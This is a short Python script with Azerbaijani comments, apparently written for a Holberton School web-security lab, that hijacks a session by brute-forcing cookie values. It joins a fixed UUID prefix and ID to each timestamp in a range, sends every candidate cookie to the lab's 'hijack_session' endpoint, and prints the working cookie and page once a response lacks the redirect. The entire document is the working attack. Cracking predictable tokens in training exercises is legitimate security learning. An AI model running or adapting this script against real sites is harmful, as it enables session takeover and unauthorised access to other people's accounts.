import requests

url = "http://web0x01.hbtn/a1/hijack_session"
base_uuid = "4b28e251-7c57-4cc1-9fe"
missing_id = "8713140"

# Sənin siyahındakı iki timestamp arası
start_ts = 17687625925 
end_ts = 17687626375

print(f"Aralıq yoxlanılır: {start_ts} -> {end_ts}")

for ts in range(start_ts, end_ts + 1):
    cookie_val = f"{base_uuid}-{missing_id}-{ts}"
    cookies = {'hijack_session': cookie_val}
    
    # allow_redirects=True mütləqdir ki, 308-i keçib əsl səhifəyə çatsın
    response = requests.get(url, cookies=cookies, allow_redirects=True)
    
    # Ekranda fərqli bir şey görsək dayansın
    # Adətən flag olan səhifənin uzunluğu (length) digərlərindən fərqli olur
    if "Redirecting" not in response.text:
        print(f"\n[!!!] TAPILDI! Timestamp: {ts}")
        print(f"Düzgün Cookie: {cookie_val}")
        print("Səhifə Məzmunu:", response.text)
        break
